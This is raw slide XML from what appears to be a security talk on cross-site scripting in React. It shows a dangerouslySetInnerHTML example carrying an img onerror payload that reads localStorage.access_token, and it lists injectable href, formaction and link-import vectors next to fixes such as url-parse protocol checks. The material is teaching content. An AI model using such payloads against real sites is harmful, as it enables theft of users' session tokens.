                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>className</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:highlight>
                            <a:srgbClr val="FFFF00"/>
                          </a:highlight>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>:</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                          <a:effectLst/>
                          <a:highlight>
                            <a:srgbClr val="FFFF00"/>
                          </a:highlight>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> 'greeting'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:highlight>
                            <a:srgbClr val="FFFF00"/>
                          </a:highlight>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>}</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>,     //[props]</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>  'Hello</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>,</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> world</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>!</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>'</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>              </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>//[children]</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>);</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="20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86062677"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609599" y="5036596"/>
            <a:ext cx="8598195" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2">
              <a:lumMod val="95000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>dangerouslySetInnerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B00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777777"/>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777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"__html"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=x/ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>onerror</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>='alert(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>localStorage.access_token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)'&gt;"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="363427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Injections</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414462"/>
            <a:ext cx="10972800" cy="4943807"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>Href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> – injectable dynamic links - &lt;a&gt; tag:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Use “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>:” schema</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Some new HTML5 attributes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Formaction</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> – for &lt;button&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Poster – for &lt;video&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>HTML5 imports</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Fixes:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Stripping out “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>:” schema</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>-parse package</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="6" name="Table 5"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1484183051"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8316686" y="1936967"/>
          <a:ext cx="3278053" cy="322864"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3278053">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3502760658"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="r"/>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a</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="0099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href</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>={</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>userinput</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>}</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>&gt;</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>Link</a:t>
                      </a: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a</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206332547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768322617"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6561996" y="2755317"/>
          <a:ext cx="5032743" cy="322864"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="5032743">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4127804679"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="190974">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="r"/>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button</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>form</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"name"</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" kern="1200" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>formaction</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>={</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="009900"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>userinput</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="777777"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>}</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2798937838"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7258295" y="3573667"/>
            <a:ext cx="4336444" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2">
              <a:lumMod val="95000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r"/>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>link</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>rel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"import"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>={</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>userinput</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="009900"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="11" name="Table 10"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2278642084"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="6909325" y="4642889"/>
          <a:ext cx="4685414" cy="810544"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="4685414">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="199542201"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="414876">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>var</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> URL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require</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a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>url</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>-parse"</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err="1">
                          <a:solidFill>
                            <a:srgbClr val="0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>var</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>url</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0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>new</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t> URL</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userinput</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0000FF"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>if</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url</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protocol</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a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0" err="1">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                        </a:rPr>
                        <a:t>javascript</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" i="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="8B0000"/>
                          </a:solidFill>
